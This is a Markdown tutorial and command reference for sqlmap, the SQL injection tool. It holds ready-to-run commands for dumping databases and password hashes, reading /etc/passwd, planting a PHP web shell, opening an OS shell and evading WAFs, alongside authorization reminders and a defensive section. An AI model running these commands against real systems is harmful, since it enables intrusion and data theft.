# SQLMap — SQL Injection Automation

---

## 1. What is sqlmap?

**sqlmap** is an open-source tool that automates the detection and exploitation of SQL injection vulnerabilities. It supports:

- Detection of injection vulnerabilities (boolean, time, error, union, stacked, etc.)
- Full database fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.)
- Database / table / column enumeration
- Data dumping
- File system access (read/write files on the DB server)
- OS command execution (via DB) — under the right conditions
- SQL shell and OS shell

### Install

```bash
sudo apt install sqlmap
sqlmap --version
```

---

## 2. The Six Injection Techniques

sqlmap uses these techniques (in order of preference):

| Technique | Letter | How it works |
|-----------|--------|-------------|
| **Boolean-based blind** | `B` | Inject `AND 1=1` vs `AND 1=2`, infer from response differences |
| **Error-based** | `E` | Trigger DB errors that include data in the message |
| **Union query-based** | `U` | Use `UNION SELECT` to append attacker's query |
| **Stacked queries** | `S` | Use `;` to run multiple queries |
| **Time-based blind** | `T` | Use `SLEEP()` and measure response time |
| **Inline queries** | `Q` | Nest a SELECT inside another |

Specify with `--technique`:

```bash
sqlmap -u "..." --technique=BEUST    # all except inline
sqlmap -u "..." --technique=T        # time-based only (slow but reliable)
```

---

## 3. Basic Usage

### GET parameter

```bash
sqlmap -u "http://target.com/page?id=1"
```

### POST data

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
```

### JSON body

```bash
sqlmap -u "http://target.com/api/login" \
    --data='{"username":"admin","password":"test"}' \
    --headers="Content-Type: application/json"
```

### URI-based injection (path parameter)

```bash
sqlmap -u "http://target.com/product/2*"   # * marks injection point
```

### From a captured request file

```bash
# Save a Burp/curl request to req.txt, then:
sqlmap -r req.txt
```

This is the cleanest method — works with any auth, cookies, headers preserved.

---

## 4. Authentication & Sessions

```bash
# Cookie
sqlmap -u "http://target.com/profile?id=1" --cookie="PHPSESSID=abc123; auth=token"

# HTTP Basic Auth
sqlmap -u "..." --auth-type=Basic --auth-cred="user:pass"

# Auth via cookies — login first manually, grab cookie, pass it in
sqlmap -u "..." --cookie="session=..."

# CSRF token (auto-fetch from a URL)
sqlmap -u "..." --csrf-token=token_name --csrf-url=http://target.com/form
```

---

## 5. The Detection Phase

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# Be more thorough (slower, finds more)
sqlmap -u "..." --batch --level=5 --risk=3
```

| Flag | What it does |
|------|-------------|
| `--level=1..5` | Tests more places (cookies, headers) at higher levels |
| `--risk=1..3` | Tries more dangerous payloads at higher risk |
| `--batch` | Auto-accept all defaults (no prompts) |
| `--smart` | Only deeply test params that show heuristic signs of injection |

**Default is `--level=1 --risk=1`**. If sqlmap says "not injectable" — try `--level=3 --risk=2` before giving up.

---

## 6. Information Gathering

Once injection is confirmed, enumerate the database in stages:

### Step 1 — Identify the backend

```bash
sqlmap -u "..." --batch --fingerprint
```

Outputs: `back-end DBMS: MySQL 5.7`, etc.

### Step 2 — List databases

```bash
sqlmap -u "..." --batch --dbs
```

### Step 3 — Current DB & user info

```bash
sqlmap -u "..." --batch --current-db        # current database name
sqlmap -u "..." --batch --current-user      # who we're connecting as
sqlmap -u "..." --batch --is-dba            # are we admin/root?
sqlmap -u "..." --batch --hostname          # DB server hostname
sqlmap -u "..." --batch --users             # list DB users
sqlmap -u "..." --batch --passwords         # extract password hashes
sqlmap -u "..." --batch --privileges        # privileges per user
sqlmap -u "..." --batch --roles             # DB roles
```

### Step 4 — List tables in a database

```bash
sqlmap -u "..." --batch -D database_name --tables
```

### Step 5 — List columns in a table

```bash
sqlmap -u "..." --batch -D database_name -T users --columns
```

### Step 6 — Dump data

```bash
# Dump specific columns
sqlmap -u "..." --batch -D database_name -T users -C username,password --dump

# Dump whole table
sqlmap -u "..." --batch -D database_name -T users --dump

# Dump everything in a database
sqlmap -u "..." --batch -D database_name --dump

# Dump EVERYTHING (very loud, may take hours)
sqlmap -u "..." --batch --dump-all
```

### Step 7 — Search for specific data

```bash
# Find columns named "password" anywhere
sqlmap -u "..." --batch --search -C password

# Find tables named "users" anywhere
sqlmap -u "..." --batch --search -T user
```

---

## 7. Advanced Exploitation

### Custom SQL query

```bash
sqlmap -u "..." --batch --sql-query "SELECT username, password FROM users WHERE id=1"
```

### Interactive SQL shell

```bash
sqlmap -u "..." --batch --sql-shell

# Then at the prompt:
SQL> SELECT version();
SQL> SHOW DATABASES;
SQL> SELECT * FROM users LIMIT 5;
```

### File system access (if DBMS allows)

```bash
# Read a file from the server
sqlmap -u "..." --batch --file-read="/etc/passwd"

# Write a file to the server
sqlmap -u "..." --batch --file-write=local.php --file-dest=/var/www/html/shell.php
```

### Operating system shell

```bash
# Get an OS shell (high privilege needed)
sqlmap -u "..." --batch --os-shell
```

### Persistent attack

```bash
# Save findings; resume next session
sqlmap -u "..." --batch -s session.sqlite
```

---

## 8. WAF / Anti-Detection

When sqlmap is blocked by a WAF (Cloudflare, ModSecurity), try:

```bash
# Random User-Agent
sqlmap -u "..." --random-agent

# Use tamper scripts to evade signatures
sqlmap -u "..." --tamper=space2comment
sqlmap -u "..." --tamper=between,space2comment,randomcase

# Tor (slow)
sqlmap -u "..." --tor --tor-type=SOCKS5

# Through a proxy (Burp Suite usually 127.0.0.1:8080)
sqlmap -u "..." --proxy=http://127.0.0.1:8080

# Slow down requests
sqlmap -u "..." --delay=2 --timeout=30 --retries=5

# Skip URL encoding (sometimes helps)
sqlmap -u "..." --skip-urlencode
```

### Popular tamper scripts

```bash
# List all tamper scripts
ls /usr/share/sqlmap/tamper/

# Useful ones
--tamper=space2comment           # replace spaces with /**/
--tamper=between                 # use BETWEEN instead of >
--tamper=randomcase              # ranDOmizE Case
--tamper=charencode              # URL-encode payloads
--tamper=apostrophenullencode    # encode apostrophes
--tamper=equaltolike             # replace = with LIKE
```

---

## 9. Practical Recipes

### Recipe 1 — Standard test

```bash
sqlmap -u "http://target.com/page?id=1" --batch
```

### Recipe 2 — POST login bypass test

```bash
sqlmap -u "http://target.com/login" \
    --data="username=admin&password=test" \
    --batch
```

### Recipe 3 — Full DB enumeration once injection is found

```bash
# 1. Confirm + list DBs
sqlmap -u "..." --batch --dbs

# 2. Pick a DB and list tables
sqlmap -u "..." --batch -D appdb --tables

# 3. List columns of interesting table
sqlmap -u "..." --batch -D appdb -T users --columns

# 4. Dump that table
sqlmap -u "..." --batch -D appdb -T users --dump
```

### Recipe 4 — Behind a WAF

```bash
sqlmap -u "..." --batch \
    --random-agent \
    --tamper=space2comment,between,randomcase \
    --delay=2 \
    --level=3 \
    --risk=2
```

### Recipe 5 — Authenticated app

```bash
# Step 1: log in via browser, grab cookies
# Step 2: pass them to sqlmap
sqlmap -u "http://target.com/admin/users?id=1" \
    --cookie="PHPSESSID=abc123" \
    --batch --dbs
```

### Recipe 6 — Get a shell on the DB server (if DBA)

```bash
# After confirming --is-dba returns True
sqlmap -u "..." --batch --os-shell
```

### Recipe 7 — Crack dumped password hashes

```bash
# Dump passwords
sqlmap -u "..." --batch --passwords

# sqlmap auto-detects hash type and offers to crack with rockyou
# Or save hashes manually and use hashcat:
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 10. Critical Options Reference

### General

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL |
| `-r file` | Use a request file (best for complex auth) |
| `--data` | POST data |
| `--cookie` | Cookies |
| `--headers` | Extra HTTP headers |
| `--method=PUT` | HTTP method |
| `--batch` | Non-interactive (auto-accept) |
| `-v 0..6` | Verbosity (default 1) |

### Injection control

| Flag | Purpose |
|------|---------|
| `-p param` | Test only this parameter |
| `--skip=param` | Skip this parameter |
| `--prefix=str` | String to prepend payload with |
| `--suffix=str` | String to append payload with |
| `--dbms=mysql` | Force a specific DBMS |
| `--level=1..5` | Detection level |
| `--risk=1..3` | Risk level |
| `--technique=BEUST` | Limit techniques |

### Optimization

| Flag | Purpose |
|------|---------|
| `--threads=10` | Parallel requests |
| `--keep-alive` | Reuse HTTP connections |
| `-o` | Optimize (turbo mode) |
| `--time-sec=10` | Time-based delay (default 5) |

### Output / session

| Flag | Purpose |
|------|---------|
| `--output-dir=./out` | Custom output directory |
| `--flush-session` | Clear cached findings, start fresh |
| `--purge` | Wipe sqlmap's cache entirely |

---

## 11. Where sqlmap Stores Data

```
~/.local/share/sqlmap/output/<target>/
├── log                    # session log
├── target.txt             # target URL
├── dump/<db>/<table>.csv  # dumped data
└── session.sqlite         # injection state (so you can resume)
```

After dumping, your data lives in CSV files under `dump/`. To start fresh on the same target:

```bash
sqlmap -u "..." --flush-session
```

---

## 12. Common Errors & Fixes

| Error | Meaning | Fix |
|-------|---------|-----|
| `does not appear to be injectable` | No SQL injection found | Try `--level=5 --risk=3 --tamper=...` |
| `target URL content is heavily dynamic` | Page content varies between requests | Use `--text-only` or `-r request_file` |
| `you have been blocked` | WAF caught you | Use `--random-agent --tamper=...` slow down with `--delay=2` |
| `CAPTCHA detected` | Anti-bot protection | Probably can't proceed automatically — manual testing |
| `Could not find any usable column` | UNION exploitation failed | Try `--technique=B` (boolean) or `--technique=T` (time) |
| `connection timeout` | Server is slow | Increase `--timeout=30` |

---

## 13. What sqlmap CANNOT Do

- Bypass a properly written prepared statement (parameterized query)
- Inject through input that goes only into a NoSQL database
- Always find every form of SQLi (second-order, blind chaining)
- Defeat strong WAFs without manual tuning
- Hack you out of every legal trouble — **only test what you own / have permission for**

---

## 14. Defensive Side

To prevent your apps from being sqlmap-able:

| Defense | How |
|---------|-----|
| **Parameterized queries** | Use prepared statements / ORMs — NEVER concatenate SQL |
| **Input validation** | Whitelist allowed values |
| **Least privilege** | DB user should NOT be root/sa |
| **WAF** | Cloudflare, ModSecurity (defense-in-depth, not the only line) |
| **Error handling** | Don't echo DB errors to users |
| **Patching** | Keep DB and framework versions current |

If your code uses `WHERE id=$user_input` with string concatenation — you're vulnerable. If it uses `WHERE id=?` with parameterized binding — you're not.

---

## 15. Quick Reference

```bash
# Detection
sqlmap -u "http://target.com/page?id=1" --batch

# Enumeration
sqlmap -u "..." --batch --dbs                       # list DBs
sqlmap -u "..." --batch -D dbname --tables          # list tables
sqlmap -u "..." --batch -D dbname -T users --columns   # columns
sqlmap -u "..." --batch -D dbname -T users --dump   # dump table

# Useful queries
sqlmap -u "..." --batch --current-db
sqlmap -u "..." --batch --current-user
sqlmap -u "..." --batch --is-dba
sqlmap -u "..." --batch --passwords

# POST data
sqlmap -u "..." --data="user=a&pass=b" --batch

# JSON body
sqlmap -u "..." --data='{"a":"b"}' --headers="Content-Type: application/json" --batch

# Authenticated
sqlmap -u "..." --cookie="session=abc" --batch

# WAF evasion
sqlmap -u "..." --random-agent --tamper=space2comment,randomcase --batch

# OS shell (DBA only)
sqlmap -u "..." --os-shell

# SQL shell
sqlmap -u "..." --sql-shell

# Reset / fresh start
sqlmap -u "..." --batch --flush-session
```

### Three rules

1. **Get authorization first.** Running sqlmap on someone else's site is a crime in most jurisdictions.
2. **Start with `--batch` and default settings.** Escalate to higher level/risk only when needed.
3. **A failed test ≠ no vulnerability.** Try `--level=5 --risk=3 --tamper=...` and use a request file (`-r`) before concluding.
